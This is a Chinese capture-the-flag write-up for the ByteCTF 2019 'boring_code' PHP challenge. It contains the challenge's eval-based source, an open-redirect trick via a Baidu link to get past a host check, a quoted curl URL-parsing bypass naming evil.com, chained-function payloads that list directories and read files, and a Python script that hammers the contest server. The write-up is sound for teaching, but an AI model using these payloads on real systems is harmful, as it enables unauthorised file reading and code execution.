        <content type="html"><![CDATA[<h2 id="白盒审计">## 白盒审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'$url: '</span>.$url.<span class="string">"\n"</span>);</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'$code: '</span>.$code.<span class="string">"\n"</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="主要两个bypass点"><strong>主要两个bypass点</strong></h3><h4 id="绕过filter_var和parse_url">1. 绕过filter_var和parse_url</h4><h4 id="令code在preg_match下进行文件读取">2. 令code在preg_match下进行文件读取</h4><table><tbody><tr class="odd"><td>## Bypass 0x01</td></tr></tbody></table><p>对于如何绕过filter_var(), preg_match() 和 parse_url()，我找到师傅的一篇<a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">博客</a>，但这篇博客是针对curl的，在这题貌似并不适用 而且对这篇的一个bypass手法我有些懵 利用<code>0://evil.com:port;baidu.com:80</code>这样的url（0为传输协议，非http，为了绕过filter_var()) curl解析到;停止，这样就访问了<code>0://evil.com:port</code>，但是非http协议的话，比如ftp，我们直接访问<code>ftp://evil.com:port</code>，貌似取不到文件里的内容（先留个坑）</p><p>但还有师傅的wp里说可以ftp协议绕过-.-</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-54-35.png"></p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-54-09.png"></p><p>那么不选择氪金的话，我们就利用百度的跳转漏洞叭... ### 贴吧🏄‍</p><ol type="1"><li><p>去贴吧随便找个小贴子，发表评论（评论内容是你要跳转的链接） 发布后审查元素看到你发表的链接对应的href <img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_13-06-19.png"></p></li><li><p>将jump.bdimg.com改为post.baidu.com后得到的新链接即可直接跳转至你想要的站点</p></li></ol><p>ok第一步bypass成功</p><table><tbody><tr class="odd"><td>## Bypass 0x02</td></tr></tbody></table><p>preg_match限制我们file_get_contents得到的内容只能是a(b(c(d())))这样的格式 <strong>(?R)指迭代若干次正则表达式整体</strong></p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_12-12-16.png"></p><p>而且又有一串的黑名单过滤，所以基本放弃getshell，尝试文件读取 但由于刚刚说的正则匹配白名单，我们不能传入scandir('.')这样的式子，但这个式子等价scandir(chr(46))，且phpversion()是个数字，我们可以通过一串数学函数把phpversion()转化成我们要的46</p><p>首先探测phpversion信息：</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-42-09.png"></p><p>发现是5.*版本的php，那就从5/6出发去获得46</p><p>给出数学函数的fuzz脚本（这里利用迭代加深搜索</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">math_fuzz</span><span class="params">($tmp, $goal, $depth = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">$math_func = [<span class="string">'sin'</span>, <span class="string">'cos'</span>, <span class="string">'tan'</span>,  <span class="string">'asin'</span>, <span class="string">'acos'</span>, <span class="string">'atan'</span>, <span class="string">'sqrt'</span>, <span class="string">'ceil'</span>, <span class="string">'floor'</span>,<span class="string">'sinh'</span>,<span class="string">'cosh'</span>,<span class="string">'tanh'</span>];</span><br><span class="line"><span class="keyword">if</span>($depth &gt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($math_func <span class="keyword">as</span> $func) &#123;</span><br><span class="line"><span class="keyword">if</span>(ceil($func($tmp)) == $goal) &#123;</span><br><span class="line">$res = [];</span><br><span class="line">array_push($res, <span class="string">'ceil'</span>, $func);</span><br><span class="line"><span class="keyword">return</span>  $res;</span><br><span class="line">&#125; <span class="keyword">elseif</span>( floor($func($tmp)) == $goal) &#123;</span><br><span class="line">$res = [];</span><br><span class="line">array_push($res, <span class="string">'floor'</span>, $func);</span><br><span class="line"><span class="keyword">return</span>  $res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$res = [];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($res = math_fuzz($func($tmp), $goal, $depth + <span class="number">1</span>))) &#123;</span><br><span class="line">array_push($res, $func);</span><br><span class="line"><span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$orig = <span class="number">5</span>;</span><br><span class="line">$goal = <span class="number">46</span>;</span><br><span class="line">$res = math_fuzz($orig, $goal);</span><br><span class="line"><span class="keyword">foreach</span>($res <span class="keyword">as</span> $func) &#123;</span><br><span class="line"><span class="keyword">print</span> $func.<span class="string">'('</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> $orig;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($res); $i++) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">')'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">' = '</span>.$goal.<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>fuzz结果如下图：</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-49-17.png"></p><p>那么我们就能遍历目录下文件名了，但scandir的返回值是个数组类型，php里能输出数组的几个函数（如var_dump和print_r）在正则匹配白名单下均不可用，所以我们利用readfile+end来读取scandir返回数组的末尾元素里的内容（好像当时比赛有hint</p><p>那么我们就可以构造出如下payload（把跳转链接到的站点内容变为payload）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(floor(phpversion())))))))))));</span><br></pre></td></tr></table></figure><p>发包结果</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_00-47-55.png"></p><p>但这并不是真正的flag，所以还得继续（flag在父目录里噢 我们可以利用scandir(next(scandir(chr(46))))来遍历父目录下文件名，但父目录文件的readfile需要在文件名前加上../（这显然不好实现</p><p>所以我们选择的思路的先chdir切换当前工作目录，再进行文件读取 而chdir的返回值是个true（bool类型），那么我们就考虑将整个chdir作为time函数的参数</p><h3 id="time函数浅析">time函数浅析</h3><p>翻手册我们发现time函数的声明是time(void)，返回int，这个void就给了我们可以任意传值的机会（但可能会有warning，不管看不见</p><p>有了time函数，我们再来看看localtime函数，对于它的函数声明如下</p><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/Snipaste_2019-10-22_13-43-03.png"></p><p>localtime(time(true))就能返回一个数组，而这个数组的首位元素就是当前的秒数，那么我们就可以在当前秒数为46时成功再拿到一次chr(46)</p><p>ps：php里取首个元素的函数用pos和current都可（这里采用pos</p><p>给出最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(floor(phpversion()))))))))))))))))));</span><br></pre></td></tr></table></figure><p>再写个py脚本来连续发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://47.100.93.189:2512/boring_code.php'</span></span><br><span class="line">data = &#123;<span class="string">'url'</span>: <span class="string">'http://post.baidu.com/safecheck/index?url=x+Z5mMbGPAtT5bBkiEfIO4vDTfcsCssRh5DioYNT33UpgtTWaHrk8IT33QgV1hlBBTwtTfgUQIGUYYnYLaYspm/cr484U4pssMDF8z9+LzC+JwaIavihzSWyZP8Xm7Qhec/AZ+IFwcQwPGbuJnYGNA=='</span>&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">rec = <span class="string">'Test[%2d]'</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">cur += <span class="number">1</span></span><br><span class="line">r = s.post(url, data = data)</span><br><span class="line">print(rec%cur)</span><br><span class="line"><span class="keyword">for</span> sub_r <span class="keyword">in</span> re.findall(<span class="string">r"bytectf\&#123;.*?\&#125;"</span>, r.text):</span><br><span class="line">print(sub_r)</span><br><span class="line">exit(<span class="string">'Got it!'</span>)</span><br><span class="line">time.sleep(<span class="number">0.9</span>)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2019/10/22/ByteCTF2019-boring-code/2019-10-22-01-51-03-的屏幕截图.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
